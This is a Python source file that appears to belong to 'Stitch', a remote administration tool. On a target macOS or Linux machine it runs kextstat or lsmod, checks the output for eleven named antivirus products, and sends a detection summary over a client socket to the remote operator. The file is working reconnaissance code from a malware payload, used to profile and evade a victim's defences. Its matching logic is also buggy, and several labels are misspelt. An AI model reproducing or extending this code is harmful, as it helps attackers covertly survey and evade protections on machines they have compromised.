# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import subprocess

def av_scan(av):
    if osx_client():
        av_check = run_command('kextstat')
    elif lnx_client():
        av_check = run_command('lsmod')
    for line in av_check:
        if av in av_check:
            return line
    return False

escan = av_scan('eScan')
avira = av_scan('Avira')
panda = av_scan('Panda')
sophos = av_scan('Sophos')
ahnlab = av_scan('AhnLab')
mcafee = av_scan('McAfee')
bguard = av_scan('BullGuard')
fsecure = av_scan('F-Secure')
symantec = av_scan('Symantec')
bitdef = av_scan('BitDefender')
tmicro = av_scan('Trend Micro')

av_summary = ''
if avira: av_summary += 'Avira Antivirus:\t\tDetected\n'
if panda: av_summary += 'Panda Antivirus:\t\tDetected\n'
if mcafee: av_summary += 'McAfee Antivirus:\t\tDetected\n'
if sophos: av_summary += 'Sophos Antivirus:\t\tDetected\n'
if ahnlab: av_summary += 'AhnLab V3 Antirus:\t\tDetected\n'
if bguard: av_summary += 'BullGuard Antirus:\t\tDetected\n'
if bitdef: av_summary += 'BitDefender Antirus:\t\tDetected\n'
if fsecure: av_summary += 'F-Secure Antivirus:\t\tDetected\n'
if escan: av_summary += 'escan Micro Antivirus:\t\tDetected\n'
if symantec: av_summary += 'Symantec Antivirus:\t\tDetected\n'
if tmicro: av_summary += 'Trend Micro Antivirus:\t\tDetected\n'

if (not mcafee and not sophos and not ahnlab \
    and not symantec and not avira and not panda \
    and not bitdef and not fsecure and not bguard \
    and not tmicro and not escan):
    av_summary += 'No Antiviruses detected.\n'

send(client_socket,av_summary)
